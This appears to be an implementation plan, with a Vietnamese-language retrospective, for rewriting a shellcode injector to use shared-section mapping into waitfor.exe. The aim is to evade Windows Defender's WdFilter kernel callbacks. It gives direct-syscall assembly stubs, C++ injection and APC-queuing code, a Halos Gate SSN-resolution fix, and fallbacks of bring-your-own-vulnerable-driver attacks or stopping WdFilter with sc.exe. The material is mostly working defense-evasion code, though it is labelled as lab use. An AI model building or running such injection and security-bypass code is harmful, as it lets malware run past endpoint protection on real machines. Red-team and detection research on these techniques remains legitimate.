# Section-Based Injection — Implementation Plan

Replace `NtAllocateVirtualMemory + NtWriteVirtualMemory + NtProtectVirtualMemory` (cross-process, monitored by WdFilter ObCallback) with a shared-section flow that avoids cross-process writes entirely.

## Root Cause

`WdFilter.sys` (Windows Defender kernel driver, STATE: RUNNING) registers `ObRegisterCallbacks` on process objects. It intercepts `NtAllocateVirtualMemory` and `NtWriteVirtualMemory` calls that carry a remote process handle and returns `STATUS_ACCESS_VIOLATION (0xC0000005)` to deny them. Direct syscalls bypass ntdll user-space hooks but cannot bypass kernel-mode callbacks.

## New Injection Flow

```
Current (blocked):
  NtAllocateVirtualMemory(h_waitfor, RW)   ← denied by WdFilter
  NtWriteVirtualMemory(h_waitfor, ...)     ← denied by WdFilter
  NtProtectVirtualMemory(h_waitfor, RX)   ← denied by WdFilter

Replacement:
  NtCreateSection(RWX, SEC_COMMIT)                    ← no remote handle
  NtMapViewOfSection(section, NtCurrentProcess(), RW) ← local, not monitored
  memcpy(local_view, shellcode)                       ← plain local write
  NtMapViewOfSection(section, h_waitfor, RX)          ← mapping, not write
  NtUnmapViewOfSection(NtCurrentProcess(), local_view)
  ↓ shellcode now in waitfor.exe via shared mapping
  NtQueueApcThread(h_thread, remote_view)             ← unchanged
  NtResumeThread(h_thread)                            ← unchanged
```

No cross-process writes. WdFilter callback does not trigger on `NtMapViewOfSection` by default.

---

## Files to Modify

### 1. `src/common/syscalls.asm`

Append three stubs after the existing five. Same pattern as existing stubs — placeholder SSN `0DEADBEEFh` patched at runtime by `InitSyscalls()`.

```asm
PUBLIC SysNtCreateSection
PUBLIC SysNtMapViewOfSection
PUBLIC SysNtUnmapViewOfSection

SysNtCreateSection PROC
    mov r10, rcx
    mov eax, 0DEADBEEFh
    syscall
    ret
SysNtCreateSection ENDP

SysNtMapViewOfSection PROC
    mov r10, rcx
    mov eax, 0DEADBEEFh
    syscall
    ret
SysNtMapViewOfSection ENDP

SysNtUnmapViewOfSection PROC
    mov r10, rcx
    mov eax, 0DEADBEEFh
    syscall
    ret
SysNtUnmapViewOfSection ENDP
```

---

### 2. `src/common/syscalls.hpp`

Add extern "C" declarations. Signatures from phnt — all types already available via existing phnt include.

```cpp
extern "C" NTSTATUS SysNtCreateSection(
    PHANDLE            SectionHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER     MaximumSize,
    ULONG              SectionPageProtection,
    ULONG              AllocationAttributes,
    HANDLE             FileHandle
);

extern "C" NTSTATUS SysNtMapViewOfSection(
    HANDLE          SectionHandle,
    HANDLE          ProcessHandle,
    PVOID*          BaseAddress,
    ULONG_PTR       ZeroBits,
    SIZE_T          CommitSize,
    PLARGE_INTEGER  SectionOffset,
    PSIZE_T         ViewSize,
    SECTION_INHERIT InheritDisposition,
    ULONG           AllocationType,
    ULONG           Win32Protect
);

extern "C" NTSTATUS SysNtUnmapViewOfSection(
    HANDLE ProcessHandle,
    PVOID  BaseAddress
);
```

---

### 3. `src/common/syscalls.cpp` — `InitSyscalls()`

Expand `target_names[]` and `stub_addrs[]` from 5 to 8. No other changes to the function.

```cpp
const char* target_names[] = {
    "NtAllocateVirtualMemory",   // kept — used by other paths if any
    "NtWriteVirtualMemory",
    "NtProtectVirtualMemory",
    "NtQueueApcThread",
    "NtResumeThread",
    "NtCreateSection",           // new
    "NtMapViewOfSection",        // new
    "NtUnmapViewOfSection",      // new
};
void* stub_addrs[] = {
    reinterpret_cast<void*>(&SysNtAllocateVirtualMemory),
    reinterpret_cast<void*>(&SysNtWriteVirtualMemory),
    reinterpret_cast<void*>(&SysNtProtectVirtualMemory),
    reinterpret_cast<void*>(&SysNtQueueApcThread),
    reinterpret_cast<void*>(&SysNtResumeThread),
    reinterpret_cast<void*>(&SysNtCreateSection),        // new
    reinterpret_cast<void*>(&SysNtMapViewOfSection),     // new
    reinterpret_cast<void*>(&SysNtUnmapViewOfSection),   // new
};
// loop count: change 5 → 8
for (int i = 0; i < 8; i++) { ... }
```

> Note: `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtProtectVirtualMemory` are still resolved (kept in list) in case their stubs are referenced elsewhere. They just won't be called from `InjectAndSpawn` anymore.

---

### 4. `src/common/inject.cpp` — `InjectAndSpawn()`

Replace the three blocked steps with section-based equivalents. `NtQueueApcThread` and `NtResumeThread` are unchanged.

#### Variables to add

```cpp
HANDLE h_section = NULL;
PVOID  local_view = NULL;
PVOID  remote_view = NULL;
```

#### Replace Alloc + Write + Protect block with

```cpp
// Create shared section — no remote handle involved
LARGE_INTEGER section_size;
section_size.QuadPart = static_cast<LONGLONG>(shellcode_size);

status = SysNtCreateSection(
    &h_section,
    SECTION_ALL_ACCESS,
    NULL,
    &section_size,
    PAGE_EXECUTE_READWRITE,
    SEC_COMMIT,
    NULL
);
if (status != 0) {
    AesLogger::LogError(log_ctx, XorString("NtCreateSection failed. NTSTATUS: 0x%08X"), status);
    result = status;
    break;
}

// Map RW view into local process — write shellcode without cross-process write
SIZE_T local_view_size = 0;
status = SysNtMapViewOfSection(
    h_section,
    (HANDLE)-1,          // NtCurrentProcess()
    &local_view,
    0, 0, NULL,
    &local_view_size,
    (SECTION_INHERIT)2,  // ViewUnmap
    0,
    PAGE_READWRITE
);
if (status != 0) {
    AesLogger::LogError(log_ctx, XorString("NtMapViewOfSection (local) failed. NTSTATUS: 0x%08X"), status);
    result = status;
    break;
}

memcpy(local_view, local_shellcode, shellcode_size);

// Map RX view into waitfor.exe — shellcode appears without cross-process write
SIZE_T remote_view_size = 0;
status = SysNtMapViewOfSection(
    h_section,
    h_process,
    &remote_view,
    0, 0, NULL,
    &remote_view_size,
    (SECTION_INHERIT)2,  // ViewUnmap
    0,
    PAGE_EXECUTE_READ
);
if (status != 0) {
    AesLogger::LogError(log_ctx, XorString("NtMapViewOfSection (remote) failed. NTSTATUS: 0x%08X"), status);
    result = status;
    break;
}

// Unmap local view — shellcode no longer needed locally
SysNtUnmapViewOfSection((HANDLE)-1, local_view);
local_view = NULL;
```

#### Log messages to add (before each call)

```cpp
AesLogger::LogDebug(log_ctx, XorString("Creating shared section."));
AesLogger::LogDebug(log_ctx, XorString("Mapping section into local process."));
AesLogger::LogDebug(log_ctx, XorString("Copying shellcode to local view."));
AesLogger::LogDebug(log_ctx, XorString("Mapping section into waitfor.exe."));
```

#### Cleanup block — add section and views

```cpp
if (local_view) {
    SysNtUnmapViewOfSection((HANDLE)-1, local_view);
}
if (remote_view && h_process) {
    SysNtUnmapViewOfSection(h_process, remote_view);  // only on error path
}
if (h_section) {
    fp->fp_CloseHandle(h_section);
}
```

`ApcThread` target changes from `remote_shellcode` to `remote_view`:
```cpp
status = SysNtQueueApcThread(h_thread, remote_view, NULL, NULL, NULL);
```

---

## No Changes Needed

| File | Reason |
|---|---|
| `CMakeLists.txt` | No new source files |
| Test files (`comms_test.cpp`, `exec_test.cpp`) | Test shellcode behavior post-injection, not injection mechanism |
| `CMakePresets.json` | No new build variables |
| `Flow.md` / `Phase 1.md` | Update after confirming injection works |

---

## Risk Notes

- `PAGE_EXECUTE_READWRITE` on the section is required to allow both the local RW view and the remote RX view from the same section object. Some EDR configurations flag `PAGE_EXECUTE_READWRITE` sections — acceptable for lab use.
- If WdFilter also monitors `NtMapViewOfSection` on remote process handles (non-default): fallback is BYOVD or stopping WdFilter (`sc.exe stop WdFilter`).
- `(HANDLE)-1` = `NtCurrentProcess()` pseudo-handle — no `GetCurrentProcess()` call needed.
- Section handle must be closed after both views are established; the views remain valid after the section handle is closed.

---

## Retrospective — Plan vs. Reality

### Nhận định đúng

| Phần | Nhận định | Kết quả |
|---|---|---|
| Root Cause | WdFilter.sys block cross-process `NtAllocateVirtualMemory`/`NtWriteVirtualMemory` qua `ObRegisterCallbacks` → `0xC0000005` | Đúng — đây là lý do chuyển sang section injection |
| Root Cause | Direct syscalls bypass user-space hooks nhưng không bypass kernel callbacks | Đúng |
| Injection Flow | Section flow (NtCreateSection → Map local RW → memcpy → Map remote RX) bypass WdFilter vì không có cross-process write | Đúng — WdFilter không block `NtMapViewOfSection` |
| syscalls.asm | 3 stubs mới, cùng template `mov r10, rcx / mov eax, 0DEADBEEFh / syscall / ret` | Đúng — implement đúng như plan |
| inject.cpp | Flow thay thế Alloc→Write→Protect, APC target đổi sang `remote_view`, cleanup thêm section/view | Đúng — logic injection đúng như plan |
| No Changes Needed | CMakeLists.txt, test files, presets không cần sửa | Đúng |

### Nhận định sai

| Phần | Nhận định ban đầu | Thực tế |
|---|---|---|
| syscalls.hpp | "all types already available via existing phnt include" — `SECTION_INHERIT` đã có | **Sai** — `SECTION_INHERIT` không tồn tại trong `<winternl.h>`. Phải thêm typedef enum (`ViewShare=1, ViewUnmap=2`) |
| syscalls.cpp | "Expand target_names[] and stub_addrs[] from 5 to 8. **No other changes** to the function" | **Sai** — đây là sai lầm lớn nhất của plan. Halos Gate có bug structural khiến 3 syscall mới resolve SSN sai hoàn toàn (xem bên dưới) |
| Risk Notes | "If WdFilter also monitors NtMapViewOfSection on remote process handles (non-default): fallback is BYOVD" | **Sai một phần** — WdFilter **có hook** `NtMapViewOfSection` (ntdll bytes: `4C 8B D1 E9`), nhưng hook không **block** section mapping. Plan conflated "hook" với "block". Thực tế chỉ cần resolve đúng SSN qua Halos Gate là đủ |
| inject.cpp cleanup | Plan có `SysNtUnmapViewOfSection(h_process, remote_view)` trên error path | Bỏ — follow convention hiện tại: không terminate/cleanup suspended process on error |
| inject.cpp | Plan dùng `(SECTION_INHERIT)2` cast | Dùng `ViewUnmap` enum value sau khi thêm typedef |

### Thay đổi ngoài plan — Halos Gate sort-by-address fix

Plan hoàn toàn không dự đoán vấn đề này. Đây là blocker thực sự.

**Vấn đề:** `g_export_buffer` được build theo thứ tự export table của ntdll — sorted **alphabetically by name**. Halos Gate tìm entry kề trong buffer để interpolate SSN, giả định entry kề nhau = SSN kề nhau. Giả định này **chỉ đúng khi buffer sorted by function address**, vì ntdll layout syscall stubs tuần tự theo SSN trong code section.

**Triệu chứng:** `NtMapViewOfSection` (SSN thực ~168) được resolve SSN = `0x0004`. Kernel dispatch syscall #4 (function khác), nhận arguments không match → `STATUS_ACCESS_DENIED (0xC0000022)`. Lần đầu bị nhầm tưởng WdFilter block section mapping.

**Fix (không nằm trong plan):**

```cpp
// syscalls.cpp — ntexport_entry struct
struct ntexport_entry {
    DWORD name_rva;
    DWORD func_rva;   // ← thêm field mới
    DWORD ordinal;
    bool is_hooked;
    uint32_t ssn;
};

// Sau khi build buffer, sort by function address
for (DWORD i = 1; i < g_export_count; i++) {
    ntexport_entry key = g_export_buffer[i];
    int j = static_cast<int>(i) - 1;
    while (j >= 0 && g_export_buffer[j].func_rva > key.func_rva) {
        g_export_buffer[j + 1] = g_export_buffer[j];
        j--;
    }
    g_export_buffer[j + 1] = key;
}
```

**Tại sao plan không phát hiện:** Plan chỉ đánh giá inject.cpp flow và syscall stub registration. Halos Gate resolution logic (`resolve_ssn_halos`) đã hoạt động với 5 syscall ban đầu vì tình cờ các function đó (NtAllocateVirtualMemory, NtWriteVirtualMemory, NtProtectVirtualMemory, NtQueueApcThread, NtResumeThread) khi bị hook đều có neighbor alphabetically gần đúng SSN. Khi thêm NtMapViewOfSection — function có khoảng cách alphabetical ↔ SSN lớn — bug mới bộc lộ.

**Lesson:** Khi mở rộng scope của một hệ thống (thêm target vào Halos Gate), phải review **assumption cơ bản** của hệ thống đó (adjacent = adjacent SSN), không chỉ review interface (thêm entry vào array).

### Quá trình debug (3 bước)

| Bước | Diagnostic thêm | Phát hiện |
|---|---|---|
| 1 | Log SSN value sau patch | SSN = `0x0004` — sai, phải > `0x004A` |
| 2 | Log raw ntdll bytes | Xác nhận hook pattern `4C 8B D1 E9`, loại trừ `is_syscall_stub` detect sai |
| 3 | Log Halos Gate neighbor (name + SSN + distance) | Neighbor = `NtMapUserPhysicalPagesScatter` (SSN=3, kề alphabetically) — root cause: sort by name |
